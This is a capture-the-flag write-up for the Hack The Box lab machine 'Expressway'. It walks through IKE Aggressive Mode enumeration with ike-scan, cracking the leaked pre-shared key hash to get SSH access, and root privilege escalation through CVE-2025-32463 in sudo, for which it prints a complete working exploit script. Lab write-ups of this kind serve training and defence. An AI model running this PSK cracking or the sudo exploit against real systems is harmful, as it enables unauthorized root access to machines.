# Expressway

**Target IP:** `10.129.238.52`  
**Hostname:** `expressway.htb`  
**Platform:** `Linux`  
**Difficulty:** `Easy`

---

## 1. Enumeration

### Port Scan

Originally, using a fast TCP scan I found only port 22 open, however, after running a larger scan, I found an additional UDP port:
```bash
sudo nmap -sU expressway.htb 
```

```
PORT    STATE  SERVICE
22/tcp  open   ssh
500/udp open   isakmp
```

Only SSH is open on TCP. UDP port 500 is running IKE, which is used for IPsec VPN negotiation — an unusual attack surface worth investigating.

---

## 2. IKE Enumeration

I had no clue what IKE was to begin with so started with some research (https://www.cbtnuggets.com/common-ports/what-is-port-500.) Hunting around I found a tool which can perform some useful enumeration for us (https://github.com/royhills/ike-scan)
### Main Mode Scan

Running `ike-scan` against the target reveals an IKE endpoint supporting Main Mode:

```bash
ike-scan -M expressway.htb
```
![](Screenshots/Pasted%20image%2020260413163919.png)

The configuration reveals PSK (Pre-Shared Key) authentication is in use alongside XAUTH, which means we may be able to capture and crack the PSK hash.

### Aggressive Mode — PSK Hash Capture

Switching to Aggressive Mode with a fake identity leaks the PSK hash along with a username:

```
ike-scan -P -M -A -n fakeID2 expressway.htb
```
![](Screenshots/Pasted%20image%2020260413163955.png)

Two key pieces of information are returned — the username `ike@expressway.htb` and the PSK hash itself.

---

## 3. Initial Foothold — PSK Cracking

### Cracking the Hash

The captured PSK parameters are saved to `ike.hash` and cracked with `psk-crack` (an additional tool provided in the ike-scan repository) against the rockyou wordlist:

```
psk-crack -d /usr/share/wordlists/rockyou.txt ike.hash
```
![](Screenshots/Pasted%20image%2020260413164054.png)

This gives the password as `freakingrockstarontheroad`
### SSH Access

Testing the cracked credential directly against SSH — using the username `ike` and the recovered password — succeeds, granting user-level access and the user flag:
![](Screenshots/Pasted%20image%2020260413164159.png)

---

## 4. Privilege Escalation — CVE-2025-32463 (sudo)

### Enumeration

I start my enumeration as usual with 
```bash
sudo -l
```
But this returns nothing. 

Next I hunt around on the file system but I can't see anything particularly interesting. At this stage I run linpeas to help us out.

This highlights that the installed `sudo` version (1.9.17) is vulnerable to CVE-2025-32463, a local privilege escalation vulnerability. We can verify the sudo version using:
```bash
sudo -V
```
![](Screenshots/Pasted%20image%2020260413164505.png)

### Exploitation

To exploit this I use the PoC script given at https://github.com/kh4sh3i/CVE-2025-32463.

The script is very short:
```bash
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

After we execute this, we get a shell as root and can grab the root flag:
![](Screenshots/Pasted%20image%2020260413164745.png)

---

## Summary

|Step|Technique|
|---|---|
|Initial access|IKE Aggressive Mode used to leak PSK hash; `psk-crack` against rockyou recovers plaintext credential|
|User shell|Recovered PSK used directly as SSH password for user `ike`|
|Privilege escalation|CVE-2025-32463 exploited against vulnerable `sudo` version to obtain root shell|